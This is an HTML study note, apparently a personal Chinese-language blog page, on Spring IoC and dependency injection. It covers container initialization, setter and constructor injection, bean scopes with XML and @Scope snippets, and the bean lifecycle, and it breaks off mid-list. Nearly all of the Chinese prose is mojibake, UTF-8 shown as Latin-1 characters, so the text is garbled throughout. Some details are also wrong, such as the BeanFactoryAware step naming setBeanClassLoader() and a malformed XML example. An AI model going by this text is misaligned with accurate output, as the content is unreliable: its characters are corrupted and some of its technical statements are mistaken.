<p><strong>ä¾èµ–æ³¨å…¥</strong>(DI)å’Œ<strong>æ§åˆ¶åè½¬</strong>(IOC)æ˜¯ä»ä¸åŒçš„è§’åº¦çš„æè¿°çš„åŒä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯æŒ‡é€šè¿‡å¼•å…¥IOCå®¹å™¨ï¼Œåˆ©ç”¨ä¾èµ–å…³ç³»æ³¨å…¥çš„æ–¹å¼ï¼Œå®ç°å¯¹è±¡ä¹‹é—´çš„<strong>è§£è€¦</strong>ã€‚</p>
<p>IOCå®¹å™¨çš„å·¥ä½œæ¨¡å¼çœ‹åšæ˜¯<strong>å·¥å‚æ¨¡å¼</strong>çš„å‡åï¼Œå¯ä»¥æŠŠIOCå®¹å™¨çœ‹ä½œæ˜¯ä¸€ä¸ªå·¥å‚ï¼Œè¿™ä¸ªå·¥å‚é‡Œè¦ç”Ÿäº§çš„å¯¹è±¡éƒ½åœ¨é…ç½®æ–‡ä»¶ä¸­ç»™å‡ºå®šä¹‰ï¼Œç„¶ååˆ©ç”¨ç¼–ç¨‹è¯­è¨€çš„çš„<strong>åå°„</strong>ç¼–ç¨‹ï¼Œæ ¹æ®é…ç½®æ–‡ä»¶ä¸­ç»™å‡ºçš„ç±»åç”Ÿæˆç›¸åº”çš„å¯¹è±¡ã€‚ä»å®ç°æ¥çœ‹ï¼ŒIOCæ˜¯æŠŠä»¥å‰åœ¨å·¥å‚æ–¹æ³•é‡Œå†™æ­»çš„å¯¹è±¡ç”Ÿæˆä»£ç ï¼Œæ”¹å˜ä¸ºç”±é…ç½®æ–‡ä»¶æ¥å®šä¹‰ï¼Œä¹Ÿå°±æ˜¯æŠŠå·¥å‚å’Œå¯¹è±¡ç”Ÿæˆè¿™ä¸¤è€…ç‹¬ç«‹åˆ†éš”å¼€æ¥ï¼Œç›®çš„å°±æ˜¯æé«˜çµæ´»æ€§å’Œå¯ç»´æŠ¤æ€§</p>
<p>Spring æ—¶ä»£æˆ‘ä»¬ä¸€èˆ¬é€šè¿‡ XML æ–‡ä»¶æ¥é…ç½® Beanï¼Œåæ¥å¼€å‘äººå‘˜è§‰å¾— XML æ–‡ä»¶æ¥é…ç½®ä¸å¤ªå¥½ï¼Œäºæ˜¯ SpringBoot æ³¨è§£é…ç½®å°±æ…¢æ…¢å¼€å§‹æµè¡Œèµ·æ¥ã€‚</p>
<h2 id="spring-ioc-å·¥ä½œè¿‡ç¨‹" tabindex="-1"> Spring IOC å·¥ä½œè¿‡ç¨‹</h2>
<h3 id="spring-webé¡¹ç›®iocå·¥ä½œè¿‡ç¨‹" tabindex="-1"> Spring Webé¡¹ç›®IOCå·¥ä½œè¿‡ç¨‹</h3>
<p>åœ¨Webé¡¹ç›®ä½¿ç”¨Springï¼Œæ˜¯é€šè¿‡åœ¨web.xmlé‡Œé¢é…ç½®ï¼šorg.springframework.web.context.ContextLoaderListener æ¥åˆå§‹åŒ–IOCå®¹å™¨çš„ã€‚ContextLoaderListenerè¿™ä¸ªç›‘å¬å¯¹è±¡ï¼Œç›‘å¬çš„æ˜¯ServletContextè¿™ä¸ª,å½“webå®¹å™¨åˆå§‹åŒ–ï¼ŒServletContextå‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œä¼šè§¦å‘ç›¸åº”çš„äº‹ä»¶ã€‚</p>
<p>ContextLoaderListenerç»§æ‰¿äº†ContextLoaderï¼Œå¹¶å®ç°äº†ServletContextListeneræ¥å£ï¼Œåœ¨webå®¹å™¨åˆå§‹åŒ–çš„æ—¶å€™ï¼Œä¼šè§¦å‘ServletContextListeneræ¥å£ä¸­çš„contextInitialized()æ–¹æ³•ï¼ŒåŒç†ï¼Œåœ¨å®¹å™¨å…³é—­çš„æ—¶å€™ï¼Œä¼šè§¦å‘å¯¹åº”çš„contextDestroyed()æ–¹æ³•ã€‚</p>
<h3 id="spring-éwebé¡¹ç›®iocå·¥ä½œè¿‡ç¨‹" tabindex="-1"> Spring éWebé¡¹ç›®IOCå·¥ä½œè¿‡ç¨‹</h3>
<p><strong>Spring IoCçš„åˆå§‹åŒ–è¿‡ç¨‹ï¼š</strong> è¯»å–XMLèµ„æºï¼Œå¹¶è§£æï¼Œæœ€ç»ˆæ³¨å†Œåˆ°Bean Factoryä¸­</p>
<p><img src="@source/assets/cs-note/framework/spring/SpringIOCåˆå§‹åŒ–è¿‡ç¨‹.png" alt="Spring IoCçš„åˆå§‹åŒ–è¿‡ç¨‹" loading="lazy"></p>
<ol>
<li>å‡†å¤‡ï¼šåœ¨è°ƒç”¨ClassPathXmlApplicationContextåï¼Œå…ˆä¼šå°†é…ç½®ä½ç½®ä¿¡æ¯ä¿å­˜åˆ°configLocationsï¼Œä¾›åé¢è§£æä½¿ç”¨ï¼Œä¹‹åï¼Œä¼šè°ƒç”¨AbstractApplicationContextçš„refreshæ–¹æ³•è¿›è¡Œåˆ·æ–°</li>
<li>è¯»å–ï¼šåˆ›å»ºå¤„ç†æ¯ä¸€ä¸ªresourceï¼Œå¤„ç†XMLæ¯ä¸ªå…ƒç´ ï¼Œè§£æå’Œæ³¨å†Œbeanã€‚é€šè¿‡parseBeanDefinitionElementå°†XMLçš„å…ƒç´ è§£æä¸ºBeanDefinitionï¼Œç„¶åå­˜åœ¨BeanDefinitionHolderä¸­ï¼Œç„¶åå†åˆ©ç”¨BeanDefinitionHolderå°†BeanDefinitionæ³¨å†Œï¼Œå®è´¨å°±æ˜¯æŠŠBeanDefinitionçš„å®ä¾‹putè¿›BeanFactoryä¸­</li>
<li>è§£æï¼šå¤„ç†æ¯ä¸ªBeançš„å…ƒç´ ï¼Œå¤„ç†å±æ€§çš„å€¼</li>
<li>æ³¨å†Œï¼šæœ€æ ¸å¿ƒçš„ä¸€å¥å°±æ˜¯ï¼šthis.beanDefinitionMap.put(beanName, beanDefinition)ï¼Œä¹Ÿå°±æ˜¯è¯´æ³¨å†Œçš„å®è´¨å°±æ˜¯ä»¥beanNameä¸ºkeyï¼Œä»¥beanDefinitionä¸ºvalueï¼Œå°†å…¶putåˆ°HashMapä¸­</li>
</ol>
<p>å½“å®Œæˆåˆå§‹åŒ–IOCå®¹å™¨åï¼Œå¦‚æœbeanæ²¡æœ‰è®¾ç½®lazy-init(å»¶è¿ŸåŠ è½½)å±æ€§ï¼Œé‚£ä¹ˆbeançš„å®ä¾‹å°±ä¼šåœ¨åˆå§‹åŒ–IOCå®Œæˆä¹‹åï¼ŒåŠæ—¶åœ°è¿›è¡Œåˆå§‹åŒ–ã€‚åˆå§‹åŒ–æ—¶ä¼šå…ˆå»ºç«‹å®ä¾‹ï¼Œç„¶åæ ¹æ®é…ç½®åˆ©ç”¨åå°„å¯¹å®ä¾‹è¿›è¡Œè¿›ä¸€æ­¥æ“ä½œï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹æ‰€ç¤º</p>
<p><img src="@source/assets/cs-note/framework/spring/Spring-DIè¿‡ç¨‹.png" alt="Spring DIè¿‡ç¨‹" loading="lazy"></p>
<ol>
<li>åˆ›å»ºbeançš„å®ä¾‹</li>
<li>æ³¨å…¥beançš„å±æ€§</li>
</ol>
<p><a href="https://javadoop.com/post/spring-ioc" target="_blank" rel="noopener noreferrer">IoCæºç é˜…è¯»</a></p>
<h2 id="springä¾èµ–æ³¨å…¥" tabindex="-1"> Springä¾èµ–æ³¨å…¥</h2>
<ul>
<li>setteræ–¹å¼æ³¨å…¥ï¼ˆè®¾å€¼æ³¨å…¥ï¼‰</li>
<li>æ„é€ å™¨æ–¹å¼æ³¨å…¥
<ul>
<li>Springæ”¯æŒåˆ©ç”¨æ„é€ å™¨æ³¨å…¥å‚æ•°å®ä¾‹åŒ–Beanæ–¹å¼ã€‚åªè¦åœ¨Springçš„é…ç½®æ–‡ä»¶ä¸­å¢åŠ æ„é€ å™¨å‚æ•°constructor-arg</li>
<li>Springå°±ä¼šè‡ªåŠ¨çš„è°ƒç”¨æœ‰å‚æ•°çš„æ„é€ å™¨åˆ›å»ºbeanå¯¹è±¡å®ä¾‹, æ•´ä¸ªè¿‡ç¨‹æ— éœ€ç¨‹åºç¼–ç åªéœ€è¦é…ç½®applicationContext.xmlæ–‡ä»¶å³å¯</li>
</ul>
</li>
<li>è‡ªåŠ¨è£…é…åŠŸèƒ½å®ç°å±æ€§è‡ªåŠ¨æ³¨å…¥
<ul>
<li>Spring IoCå®¹å™¨å¯ä»¥è‡ªåŠ¨è£…é…ï¼ˆautowireï¼‰ç›¸äº’åä½œbeanä¹‹é—´çš„å…³è”å…³ç³»ï¼Œautowireå¯ä»¥é’ˆå¯¹å•ä¸ªbeanè¿›è¡Œè®¾ç½®ï¼Œautowireçš„æ–¹ä¾¿ä¹‹å¤„åœ¨äºå‡å°‘xmlçš„æ³¨å…¥é…ç½®ã€‚</li>
</ul>
</li>
</ul>
<p>å½“è®¾å€¼æ³¨å…¥ä¸æ„é€ æ³¨å…¥åŒæ—¶å­˜åœ¨æ—¶ï¼Œå…ˆæ‰§è¡Œæ„é€ æ³¨å…¥ï¼Œå†æ‰§è¡Œè®¾å€¼æ³¨å…¥ã€‚</p>
<p>è®¾ç½®æ³¨å…¥</p>
<ul>
<li>ä¸ä¼ ç»Ÿçš„JavaBeançš„å†™æ³•æ›´ç›¸ä¼¼ï¼Œç¨‹åºå¼€å‘äººå‘˜æ›´å®¹æ˜“ç†è§£ã€æ¥å—ã€‚é€šè¿‡setteræ–¹æ³•è®¾å®šä¾èµ–å…³ç³»æ˜¾å¾—æ›´åŠ ç›´è§‚ã€è‡ªç„¶ã€‚</li>
<li>å¯¹äºå¤æ‚çš„ä¾èµ–å…³ç³»ï¼Œå¦‚æœé‡‡ç”¨æ„é€ æ³¨å…¥ï¼Œä¼šå¯¼è‡´æ„é€ å™¨è¿‡äºè‡ƒè‚¿ï¼Œéš¾ä»¥é˜…è¯»ã€‚Springåœ¨åˆ›å»ºBeanå®ä¾‹æ—¶ï¼Œéœ€è¦åŒæ—¶å®ä¾‹åŒ–å…¶ä¾èµ–çš„å…¨éƒ¨å®ä¾‹ï¼Œå› è€Œå¯¼è‡´æ€§èƒ½ä¸‹é™ã€‚è€Œæ˜¯ç”¨è®¾ç½®æ³¨å…¥å¯ä»¥é¿å…è¿™äº›é—®é¢˜ã€‚</li>
<li>å°¤å…¶åœ¨æŸäº›å±æ€§å¯é€‰çš„æƒ…å†µä¸‹ï¼Œå¤šå‚æ•°çš„æ„é€ å™¨æ›´åŠ ç¬¨é‡ã€‚</li>
</ul>
<p>æ„é€ å™¨æ³¨å…¥</p>
<ul>
<li>æ„é€ æ³¨å…¥å¯ä»¥å†æ„é€ å™¨ä¸­å†³å®šä¾èµ–å…³ç³»çš„æ³¨å…¥é¡ºåºï¼Œæœ‰é™ä¾èµ–çš„ä¼˜å…ˆæ³¨å…¥ã€‚ä¾‹å¦‚ï¼Œç»„ä»¶ä¸­å…¶å®ƒä¾èµ–å…³ç³»çš„æ³¨å…¥ï¼Œå¸¸å¸¸éœ€è¦ä¾èµ–äºDatasourceçš„æ³¨å…¥ã€‚é‡‡ç”¨æ„é€ æ³¨å…¥ï¼Œå¯ä»¥åœ¨ä»£ç ä¸­æ¸…æ™°åœ°å†³å®šæ³¨å…¥é¡ºåºã€‚</li>
<li>å¯¹äºä¾èµ–å…³ç³»æ— éœ€å˜åŒ–çš„Beanï¼Œæ„é€ æ³¨å…¥æ›´åŠ æœ‰ç”¨ã€‚å› ä¸ºæ²¡æœ‰setteræ–¹æ³•ï¼Œæ‰€æœ‰çš„ä¾èµ–å…³ç³»å…¨éƒ¨åœ¨æ„é€ å™¨å†…è®¾å®šã€‚å› æ­¤ï¼Œæ— éœ€æ‹…å¿ƒåç»­ä»£ç å¯¹ä¾èµ–å…³ç³»çš„ç ´åã€‚</li>
<li>ä¾èµ–å…³ç³»åªèƒ½åœ¨æ„é€ å™¨ä¸­è®¾å®šï¼Œåˆ™åªæœ‰ç»„å»ºçš„åˆ›å»ºè€…æ‰èƒ½æ”¹å˜ç»„å»ºçš„ä¾èµ–å…³ç³»ã€‚é˜Ÿç»„å»ºçš„è°ƒç”¨è€…è€Œè¨€ï¼Œç»„ä»¶å†…éƒ¨çš„ä¾èµ–å…³ç³»å®Œå…¨é€æ˜ï¼Œæ›´ç¬¦åˆé«˜å†…èšçš„åŸåˆ™ã€‚</li>
</ul>
<h2 id="spring-bean" tabindex="-1"> Spring Bean</h2>
<h3 id="bean-ä½œç”¨åŸŸ" tabindex="-1"> bean ä½œç”¨åŸŸ</h3>
<ul>
<li>singleton : å”¯ä¸€ bean å®ä¾‹ï¼ŒSpring ä¸­çš„ bean é»˜è®¤éƒ½æ˜¯å•ä¾‹çš„ã€‚</li>
<li>prototype : æ¯æ¬¡è¯·æ±‚éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ bean å®ä¾‹ã€‚å³æ¯æ¬¡è°ƒç”¨getBean() æƒ³å½“äºnew XxxBean()</li>
<li>request : æ¯ä¸€æ¬¡HTTPè¯·æ±‚éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„beanï¼Œè¯¥beanä»…åœ¨å½“å‰HTTP requestå†…æœ‰æ•ˆã€‚</li>
<li>session : æ¯ä¸€æ¬¡HTTPè¯·æ±‚éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„ beanï¼Œè¯¥beanä»…åœ¨å½“å‰ HTTP session å†…æœ‰æ•ˆã€‚</li>
<li>globalSessionï¼š å…¨å±€sessionä½œç”¨åŸŸï¼Œä»…ä»…åœ¨åŸºäºportletçš„webåº”ç”¨ä¸­æ‰æœ‰æ„ä¹‰ï¼ŒSpring5å·²ç»æ²¡æœ‰äº†ã€‚Portletæ˜¯èƒ½å¤Ÿç”Ÿæˆè¯­ä¹‰ä»£ç (ä¾‹å¦‚ï¼šHTML)ç‰‡æ®µçš„å°å‹Java Webæ’ä»¶ã€‚å®ƒä»¬åŸºäºportletå®¹å™¨ï¼Œå¯ä»¥åƒservletä¸€æ ·å¤„ç†HTTPè¯·æ±‚ã€‚ä½†æ˜¯ï¼Œä¸ servlet ä¸åŒï¼Œæ¯ä¸ª portlet éƒ½æœ‰ä¸åŒçš„ä¼šè¯</li>
</ul>
<p>äº”ç§ä½œç”¨åŸŸä¸­ï¼Œrequestã€session å’Œ globalSession ä¸‰ç§ä½œç”¨åŸŸä»…åœ¨åŸºäºwebçš„åº”ç”¨ä¸­ä½¿ç”¨ï¼Œåªèƒ½ç”¨åœ¨åŸºäº web çš„ Spring ApplicationContext ç¯å¢ƒã€‚</p>
<h4 id="singleton" tabindex="-1"> singleton</h4>
<p>å”¯ä¸€ bean å®ä¾‹</p>
<p><strong>å½“ä¸€ä¸ª bean çš„ä½œç”¨åŸŸä¸º singletonï¼Œé‚£ä¹ˆSpring IoCå®¹å™¨ä¸­åªä¼šå­˜åœ¨ä¸€ä¸ªå…±äº«çš„ bean å®ä¾‹ï¼Œå¹¶ä¸”æ‰€æœ‰å¯¹ bean çš„è¯·æ±‚ï¼Œåªè¦ id ä¸è¯¥ bean å®šä¹‰ç›¸åŒ¹é…ï¼Œåˆ™åªä¼šè¿”å›beançš„åŒä¸€å®ä¾‹ã€‚</strong> singleton æ˜¯å•ä¾‹ç±»å‹(å¯¹åº”äºå•ä¾‹æ¨¡å¼)ï¼Œå°±æ˜¯åœ¨åˆ›å»ºèµ·å®¹å™¨æ—¶å°±åŒæ—¶è‡ªåŠ¨åˆ›å»ºäº†ä¸€ä¸ªbeançš„å¯¹è±¡ï¼Œä¸ç®¡ä½ æ˜¯å¦ä½¿ç”¨ï¼Œä½†æˆ‘ä»¬å¯ä»¥æŒ‡å®šBeanèŠ‚ç‚¹çš„ <code>lazy-init=â€trueâ€</code> æ¥å»¶è¿Ÿåˆå§‹åŒ–beanï¼Œè¿™æ—¶å€™ï¼Œåªæœ‰åœ¨ç¬¬ä¸€æ¬¡è·å–beanæ—¶æ‰ä¼šåˆå§‹åŒ–beanï¼Œå³ç¬¬ä¸€æ¬¡è¯·æ±‚è¯¥beanæ—¶æ‰åˆå§‹åŒ–ã€‚ æ¯æ¬¡è·å–åˆ°çš„å¯¹è±¡éƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ã€‚æ³¨æ„ï¼Œsingleton ä½œç”¨åŸŸæ˜¯Springä¸­çš„ç¼ºçœä½œç”¨åŸŸã€‚è¦åœ¨XMLä¸­å°† bean å®šä¹‰æˆ singleton ï¼Œå¯ä»¥è¿™æ ·é…ç½®ï¼š</p>
<div><pre><code><span><span><span>&lt;</span>bean</span> <span>id</span><span><span>=</span><span>"</span>ServiceImpl<span>"</span></span> <span>class</span><span><span>=</span><span>"</span>cn.service.ServiceImpl<span>"</span></span> <span>scope</span><span><span>=</span><span>"</span>singleton<span>"</span></span><span>></span></span>
</code></pre></div><p>ä¹Ÿå¯ä»¥é€šè¿‡ <code>@Scope</code> æ³¨è§£ï¼ˆå®ƒå¯ä»¥æ˜¾ç¤ºæŒ‡å®šbeançš„ä½œç”¨èŒƒå›´ã€‚ï¼‰çš„æ–¹å¼</p>
<div><pre><code><span>@Service</span>
<span>@Scope</span><span>(</span><span>"singleton"</span><span>)</span>
<span>public</span> <span>class</span> <span>ServiceImpl</span><span>{</span>

<span>}</span>
</code></pre></div><h4 id="prototype" tabindex="-1"> prototype</h4>
<p>æ¯æ¬¡è¯·æ±‚éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ bean å®ä¾‹</p>
<p><strong>å½“ä¸€ä¸ªbeançš„ä½œç”¨åŸŸä¸º prototypeï¼Œè¡¨ç¤ºä¸€ä¸ª bean å®šä¹‰å¯¹åº”å¤šä¸ªå¯¹è±¡å®ä¾‹ã€‚prototype ä½œç”¨åŸŸçš„ bean ä¼šå¯¼è‡´åœ¨æ¯æ¬¡å¯¹è¯¥ bean è¯·æ±‚</strong>ï¼ˆå°†å…¶æ³¨å…¥åˆ°å¦ä¸€ä¸ª bean ä¸­ï¼Œæˆ–è€…ä»¥ç¨‹åºçš„æ–¹å¼è°ƒç”¨å®¹å™¨çš„ getBean() æ–¹æ³•ï¼‰æ—¶éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ bean å®ä¾‹ã€‚prototype æ˜¯åŸå‹ç±»å‹ï¼Œå®ƒåœ¨æˆ‘ä»¬åˆ›å»ºå®¹å™¨çš„æ—¶å€™å¹¶æ²¡æœ‰å®ä¾‹åŒ–ï¼Œè€Œæ˜¯å½“æˆ‘ä»¬è·å–beançš„æ—¶å€™æ‰ä¼šå»åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè€Œä¸”æˆ‘ä»¬æ¯æ¬¡è·å–åˆ°çš„å¯¹è±¡éƒ½ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡ã€‚æ ¹æ®ç»éªŒï¼Œå¯¹æœ‰çŠ¶æ€çš„ bean åº”è¯¥ä½¿ç”¨ prototype ä½œç”¨åŸŸï¼Œè€Œå¯¹æ— çŠ¶æ€çš„ bean åˆ™åº”è¯¥ä½¿ç”¨ singleton ä½œç”¨åŸŸã€‚åœ¨ XML ä¸­å°† bean å®šä¹‰æˆ prototype ï¼Œå¯ä»¥è¿™æ ·é…ç½®ï¼š</p>
<div><pre><code><span>&lt;</span>bean id<span>=</span><span>"account"</span> <span>class</span><span>=</span><span>"com.foo.DefaultAccount"</span> scope<span>=</span><span>"prototype"</span><span>/</span><span>></span>  
 æˆ–è€…
<span>&lt;</span>bean id<span>=</span><span>"account"</span> <span>class</span><span>=</span><span>"com.foo.DefaultAccount"</span> singleton<span>=</span><span>"false"</span><span>/</span><span>></span> 
</code></pre></div><p>åŒæ ·å¯ä»¥é€šè¿‡ <code>@Scope</code> æ³¨è§£çš„æ–¹å¼å®ç°</p>
<h4 id="request" tabindex="-1"> request</h4>
<p><strong>requeståªé€‚ç”¨äºWebç¨‹åºï¼Œæ¯ä¸€æ¬¡ HTTP è¯·æ±‚éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„beanï¼ŒåŒæ—¶è¯¥beanä»…åœ¨å½“å‰HTTP requestå†…æœ‰æ•ˆï¼Œå½“è¯·æ±‚ç»“æŸåï¼Œè¯¥å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå³ç»“æŸã€‚</strong> åœ¨ XML ä¸­å°† bean å®šä¹‰æˆ request ï¼Œå¯ä»¥è¿™æ ·é…ç½®ï¼š</p>
<div><pre><code><span>&lt;</span>bean id<span>=</span><span>"loginAction"</span> <span>class</span><span>=</span><span><span>cn<span>.</span></span>LoginAction</span><span>" scope="</span>request"<span>/</span><span>></span>
</code></pre></div><h4 id="session" tabindex="-1"> session</h4>
<p><strong>sessionåªé€‚ç”¨äºWebç¨‹åºï¼Œsession ä½œç”¨åŸŸè¡¨ç¤ºè¯¥é’ˆå¯¹æ¯ä¸€æ¬¡ HTTP è¯·æ±‚éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„ beanï¼ŒåŒæ—¶è¯¥ bean ä»…åœ¨å½“å‰ HTTP session å†…æœ‰æ•ˆ.ä¸requestä½œç”¨åŸŸä¸€æ ·ï¼Œå¯ä»¥æ ¹æ®éœ€è¦æ”¾å¿ƒçš„æ›´æ”¹æ‰€åˆ›å»ºå®ä¾‹çš„å†…éƒ¨çŠ¶æ€ï¼Œè€Œåˆ«çš„ HTTP session ä¸­æ ¹æ® userPreferences åˆ›å»ºçš„å®ä¾‹ï¼Œå°†ä¸ä¼šçœ‹åˆ°è¿™äº›ç‰¹å®šäºæŸä¸ª HTTP session çš„çŠ¶æ€å˜åŒ–ã€‚å½“HTTP sessionæœ€ç»ˆè¢«åºŸå¼ƒçš„æ—¶å€™ï¼Œåœ¨è¯¥HTTP sessionä½œç”¨åŸŸå†…çš„beanä¹Ÿä¼šè¢«åºŸå¼ƒæ‰ã€‚</strong></p>
<div><pre><code><span><span><span>&lt;</span>bean</span> <span>id</span><span><span>=</span><span>"</span>userPreferences<span>"</span></span> <span>class</span><span><span>=</span><span>"</span>com.foo.UserPreferences<span>"</span></span> <span>scope</span><span><span>=</span><span>"</span>session<span>"</span></span><span>/></span></span>
</code></pre></div><h4 id="globalsession" tabindex="-1"> globalSession</h4>
<p>global session ä½œç”¨åŸŸç±»ä¼¼äºæ ‡å‡†çš„ HTTP session ä½œç”¨åŸŸï¼Œä¸è¿‡ä»…ä»…åœ¨åŸºäº portlet çš„ web åº”ç”¨ä¸­æ‰æœ‰æ„ä¹‰ã€‚Portlet è§„èŒƒå®šä¹‰äº†å…¨å±€ Session çš„æ¦‚å¿µï¼Œå®ƒè¢«æ‰€æœ‰æ„æˆæŸä¸ª portlet web åº”ç”¨çš„å„ç§ä¸åŒçš„ portletæ‰€å…±äº«ã€‚åœ¨global session ä½œç”¨åŸŸä¸­å®šä¹‰çš„ bean è¢«é™å®šäºå…¨å±€portlet Sessionçš„ç”Ÿå‘½å‘¨æœŸèŒƒå›´å†…ã€‚</p>
<div><pre><code><span><span><span>&lt;</span>bean</span> <span>id</span><span><span>=</span><span>"</span>user<span>"</span></span> <span>class</span><span><span>=</span><span>"</span>com.foo.Preferences <span>"</span></span><span>scope</span><span><span>=</span><span>"</span>globalSession<span>"</span></span><span>/></span></span>
</code></pre></div><h3 id="bean-ç”Ÿå‘½å‘¨æœŸ" tabindex="-1"> bean ç”Ÿå‘½å‘¨æœŸ</h3>
<ul>
<li>Bean å®¹å™¨æ‰¾åˆ°é…ç½®æ–‡ä»¶ä¸­ Spring Bean çš„å®šä¹‰ã€‚</li>
<li>Bean å®¹å™¨åˆ©ç”¨ Java Reflection API åˆ›å»ºä¸€ä¸ªBeançš„å®ä¾‹ã€‚</li>
<li>å¦‚æœæ¶‰åŠåˆ°ä¸€äº›å±æ€§å€¼ åˆ©ç”¨ <code>set()</code>æ–¹æ³•è®¾ç½®ä¸€äº›å±æ€§å€¼ã€‚</li>
<li>å¦‚æœ Bean å®ç°äº† <code>BeanNameAware</code> æ¥å£ï¼Œè°ƒç”¨ <code>setBeanName()</code>æ–¹æ³•ï¼Œä¼ å…¥Beançš„åå­—ã€‚</li>
<li>å¦‚æœ Bean å®ç°äº† <code>BeanClassLoaderAware</code> æ¥å£ï¼Œè°ƒç”¨ <code>setBeanClassLoader()</code>æ–¹æ³•ï¼Œä¼ å…¥ <code>ClassLoader</code>å¯¹è±¡çš„å®ä¾‹ã€‚</li>
<li>å¦‚æœBeanå®ç°äº† <code>BeanFactoryAware</code> æ¥å£ï¼Œè°ƒç”¨ <code>setBeanClassLoader()</code>æ–¹æ³•ï¼Œä¼ å…¥ <code>ClassLoader</code> å¯¹è±¡çš„å®ä¾‹ã€‚</li>
<li>ä¸ä¸Šé¢çš„ç±»ä¼¼ï¼Œå¦‚æœå®ç°äº†å…¶ä»– <code>*.Aware</code>æ¥å£ï¼Œå°±è°ƒç”¨ç›¸åº”çš„æ–¹æ³•ã€‚</li>
<li>å¦‚æœæœ‰å’ŒåŠ è½½è¿™ä¸ª Bean çš„ Spring å®¹å™¨ç›¸å…³çš„ <code>BeanPostProcessor</code> å¯¹è±¡ï¼Œæ‰§è¡Œ<code>postProcessBeforeInitialization()</code> æ–¹æ³•</li>
<li>å¦‚æœBeanå®ç°äº†<code>InitializingBean</code>æ¥å£ï¼Œæ‰§è¡Œ<code>afterPropertiesSet()</code>æ–¹æ³•ã€‚</li>
<li>å¦‚æœ Bean åœ¨é…ç½®æ–‡ä»¶ä¸­çš„å®šä¹‰åŒ…å«  init-method å±æ€§ï¼Œæ‰§è¡ŒæŒ‡å®šçš„æ–¹æ³•ã€‚</li>
<li>å¦‚æœæœ‰å’ŒåŠ è½½è¿™ä¸ª Beançš„ Spring å®¹å™¨ç›¸å…³çš„ <code>BeanPostProcessor</code> å¯¹è±¡ï¼Œæ‰§è¡Œ<code>postProcessAfterInitialization()</code> æ–¹æ³•</li>
<li>å½“è¦é”€æ¯ Bean çš„æ—¶å€™ï¼Œå¦‚æœ Bean å®ç°äº† <code>DisposableBean</code> æ¥å£ï¼Œæ‰§è¡Œ <code>destroy()</code> æ–¹æ³•ã€‚</li>
<li>å½“è¦é”€æ¯ Bean çš„æ—¶å€™ï¼Œå¦‚æœ Bean åœ¨é…ç½®æ–‡ä»¶ä¸­çš„å®šä¹‰åŒ…å« destroy-method å±æ€§ï¼Œæ‰§è¡ŒæŒ‡å®šçš„æ–¹æ³•ã€‚</li>
</ul>
<p>å›¾ç¤ºï¼š</p>
<p><img src="@source/assets/cs-note/framework/spring/Spring-bean-lifecycle.png" alt="Spring Bean ç”Ÿå‘½å‘¨æœŸ" loading="lazy"></p>
<p>ä¸ä¹‹æ¯”è¾ƒç±»ä¼¼çš„ä¸­æ–‡ç‰ˆæœ¬:</p>
<p><img src="@source/assets/cs-note/framework/spring/Spring-beanç”Ÿå‘½å‘¨æœŸ.png" alt="Spring Bean ç”Ÿå‘½å‘¨æœŸ" loading="lazy"></p>
<p><strong>Springç®¡ç†çš„å•ä¾‹/éå•ä¾‹å¯¹è±¡</strong></p>
<p>Spring å®¹å™¨å¯ä»¥ç®¡ç† singleton ä½œç”¨åŸŸä¸‹ bean çš„ç”Ÿå‘½å‘¨æœŸï¼Œåœ¨æ­¤ä½œç”¨åŸŸä¸‹ï¼ŒSpring èƒ½å¤Ÿç²¾ç¡®åœ°çŸ¥é“beanä½•æ—¶è¢«åˆ›å»ºï¼Œä½•æ—¶åˆå§‹åŒ–å®Œæˆï¼Œä»¥åŠä½•æ—¶è¢«é”€æ¯ã€‚è€Œå¯¹äº prototype ä½œç”¨åŸŸçš„beanï¼ŒSpringåªè´Ÿè´£åˆ›å»ºï¼Œå½“å®¹å™¨åˆ›å»ºäº† bean çš„å®ä¾‹åï¼Œbean çš„å®ä¾‹å°±äº¤ç»™äº†å®¢æˆ·ç«¯çš„ä»£ç ç®¡ç†ï¼ŒSpringå®¹å™¨å°†ä¸å†è·Ÿè¸ªå…¶ç”Ÿå‘½å‘¨æœŸï¼Œå¹¶ä¸”ä¸ä¼šç®¡ç†é‚£äº›è¢«é…ç½®æˆprototypeä½œç”¨åŸŸçš„beançš„ç”Ÿå‘½å‘¨æœŸã€‚</p>
<h3 id="å•ä¾‹-bean-çš„çº¿ç¨‹å®‰å…¨" tabindex="-1"> å•ä¾‹ bean çš„çº¿ç¨‹å®‰å…¨</h3>
<p>å¤§éƒ¨åˆ†æ—¶å€™æˆ‘ä»¬å¹¶æ²¡æœ‰åœ¨ç³»ç»Ÿä¸­ä½¿ç”¨å¤šçº¿ç¨‹ï¼Œæ‰€ä»¥å¾ˆå°‘æœ‰äººä¼šå…³æ³¨è¿™ä¸ªé—®é¢˜ã€‚å•ä¾‹ bean å­˜åœ¨çº¿ç¨‹é—®é¢˜ï¼Œä¸»è¦æ˜¯å› ä¸ºå½“å¤šä¸ªçº¿ç¨‹æ“ä½œåŒä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œå¯¹è¿™ä¸ªå¯¹è±¡çš„éé™æ€æˆå‘˜å˜é‡çš„å†™æ“ä½œä¼šå­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</p>
<p>å¸¸è§çš„æœ‰ä¸¤ç§è§£å†³åŠæ³•ï¼š</p>
<ol>
<li>
<p>åœ¨Beanå¯¹è±¡ä¸­å°½é‡é¿å…å®šä¹‰å¯å˜çš„æˆå‘˜å˜é‡ï¼ˆä¸å¤ªç°å®ï¼‰ã€‚</p>
</li>
<li>
